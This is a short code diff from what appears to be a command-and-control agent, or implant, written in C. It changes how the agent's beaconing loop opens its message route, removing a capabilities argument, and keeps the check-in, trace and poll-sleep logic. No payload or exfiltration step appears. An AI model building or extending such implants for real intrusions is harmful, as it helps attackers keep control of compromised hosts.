@@ -928,11 +928,9 @@ __attribute__((visibility("default"))) int main(void) {
       need_checkin = 0;
     }
 
-    c2_str msg_caps_items[1] = {cfg.routes.msg};
-    c2_str_list msg_caps = {msg_caps_items, 1, 1};
     c2_secureconn msg;
     if ((st = c2_session_open_route(&s, cfg.routes.msg, c2_str_lit(""),
-                                    &msg_caps, &msg)) != C2_OK) {
+                                    &msg)) != C2_OK) {
       TRACE("[agent] msg route open failed: %d\n", st);
       need_checkin = 1;
       agent_sleep(&cfg, c2_poll_sleep_seconds(be, &cfg));
